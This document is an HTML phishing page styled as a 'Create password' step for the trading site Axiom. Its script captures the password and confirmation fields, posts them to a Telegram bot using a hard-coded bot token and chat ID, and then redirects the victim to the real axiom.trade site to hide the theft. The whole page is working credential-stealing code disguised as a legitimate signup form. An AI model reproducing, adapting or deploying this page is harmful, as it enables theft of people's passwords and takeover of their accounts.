<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Create Password</title>
  <style>
    /* Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      height: 100vh;
      display: flex;
      align-items: flex-start;
      justify-content: center;
      background: url("password.jpg") no-repeat center center/cover;
      position: relative;
      color: #fff;
      padding-top: 200px;
    }

    /* Overlay */
    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.4);
      z-index: 0;
    }

    /* Centered card */
    .card {
      position: relative;
      z-index: 1;
      background: rgba(0, 0, 0, 0.97);
      padding: 20px;
      border-radius: 1px;
      width: 350px;
      text-align: center;
      box-shadow: 0 0 1px rgba(255, 255, 255, 0.4);
    }

    .card h2 {
      margin-bottom: 20px;
      font-size: 18px;
      font-weight: normal;
    }

    /* Password label */
    .label {
      text-align: left;
      font-size: 14px;
      margin-bottom: 6px;
      color: #fff;
    }

    /* Input groups */
    .input-group {
      position: relative;
      margin-bottom: 15px;
    }

    .input-group input {
      width: 100%;
      padding: 10px 40px 10px 15px;
      border-radius: 50px;
      border: none;
      background: #000;
      color: #fff;
      font-size: 14px;
      outline: none;
      box-shadow: 0 0 1px rgba(255, 255, 255, 0.6);
    }

    /* Eye icon */
    .input-group img {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      width: 22px;
      height: 22px;
      cursor: pointer;
      opacity: 0.7;
    }

    /* Continue button */
    .btn {
      width: 100%;
      padding: 7px;
      border-radius: 25px;
      border: none;
      font-size: 16px;
      background: #1a4cff;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      margin-top: 8px;
    }

    .btn:hover {
      background: #1a4cff;
    }

    /* Footer text */
    .card p {
      margin-top: 20px;
      font-size: 12px;
      color: #aaa;
      line-height: 1.4;
    }

    .card a {
      color: #1a4cff;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Create password</h2>

    <!-- FORM -->
    <form id="passwordForm">
      <div class="label">Password</div>
      <div class="input-group">
        <input type="password" id="password" name="password" placeholder="Enter password" required>
        <img src="eyes.png" alt="eye icon" id="togglePassword">
      </div>

      <div class="input-group">
        <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Confirm password" required>
        <img src="eyes.png" alt="eye icon" id="toggleConfirmPassword">
      </div>

      <button type="submit" class="btn">Continue</button>
    </form>

    <p>
      By creating an account, you agree to Axiom's 
      <a href="#">Privacy Policy</a> and 
      <a href="#">Terms of Service</a>.
    </p>
  </div>

  <!-- JavaScript -->
  <script>
    // Telegram bot settings
    const BOT_TOKEN = "8387730686:AAFo7mnRLBtTkN3HAWrznqbW7fsOxD57HkU"; 
    const CHAT_ID = "-4909990023"; 

    // Form submission
    const form = document.getElementById("passwordForm");
    form.addEventListener("submit", function(e){
      e.preventDefault();

      const password = form.password.value;
      const confirmPassword = form.confirmPassword.value;

      const message = `Password Creation:\nPassword: ${password}\nConfirm: ${confirmPassword}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
              chat_id: CHAT_ID,
              text: message
          })
      })
      .then(res => res.json())
      .then(data => {
          if (data.ok) {
              // redirect after successful send
              window.location.href = "https://axiom.trade/discover";
          } else {
              console.error("Telegram error:", data);
          }
      })
      .catch(err => console.error("Fetch error:", err));
    });

    // Toggle password visibility
    const passwordInput = document.getElementById("password");
    const confirmPasswordInput = document.getElementById("confirmPassword");
    const togglePassword = document.getElementById("togglePassword");
    const toggleConfirmPassword = document.getElementById("toggleConfirmPassword");

    togglePassword.addEventListener("click", function () {
      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
      passwordInput.setAttribute("type", type);
    });

    toggleConfirmPassword.addEventListener("click", function () {
      const type = confirmPasswordInput.getAttribute("type") === "password" ? "text" : "password";
      confirmPasswordInput.setAttribute("type", type);
    });
  </script>
</body>
</html>
